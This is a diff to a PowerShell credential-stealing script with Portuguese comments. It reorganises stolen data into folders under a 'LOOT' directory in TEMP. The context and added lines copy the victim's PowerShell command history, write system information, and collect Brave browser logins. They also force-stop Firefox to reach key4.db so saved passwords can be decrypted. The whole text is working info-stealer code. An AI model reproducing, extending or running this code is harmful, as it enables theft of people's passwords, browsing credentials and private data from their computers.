@@ -71,6 +71,12 @@ tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt
 # Histórico da PowerShell
 Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination  $env:TEMP\$FolderName\Powershell-History.txt
 
+#Cria a pasta "Histórico-Powershell"
+New-Item -ItemType Directory -Path "$env:TEMP\$FolderName\Histórico-Powershell"
+
+#Move o ficheiro para o sitio correto
+Move-Item -Path "$env:TMP\$FolderName\Powershell-History" -Destination "$env:TEMP\$FolderName\Histórico-Powershell\Powershell-History"
+
 ############################################################################################################################################################
 
 function Get-FullName {
@@ -461,8 +467,12 @@ $drivers
 ------------------------------------------------------------------------------------------------------------------------------
 
 "@
-
-$output > $env:TEMP\$FolderName/computerData.txt
+#envia o ficheiro ComputerData para a Pasta LOOT
+$output > $env:TEMP\$FolderName/ComputerData.txt
+#Cria a pasta "PC-Info"
+New-Item -ItemType Directory -Path "$env:TEMP\$FolderName\PC-Info"
+#move para o sitio correto
+Move-Item -Path "$env:TMP\$FolderName\ComputerData.txt" -Destination "$env:TEMP\$FolderName\PC-Info\ComputerData.txt"
 
 ############################################################################################################################################################
 # Dados do Browser
@@ -527,7 +537,7 @@ Get-BrowserData -Browser "brave" -DataType "logins" >> $env:TMP\$FolderName\Brow
 Move-Item -Path "$env:TMP\$FolderName\BrowserData.txt" -Destination "$env:TEMP\$FolderName\Dados-do-Browser\BrowserData.txt"
 
 
-# Termina o processo firefox, para sacar a key4.db "para desencriptar as passwords"
+# Termina o processo firefox, para poder ter acesso a key4.db "para desencriptar as passwords"
 Get-Process -Name "firefox" | Stop-Process -Force
 
 # Puxa as palavra passes encriptadas do firefox
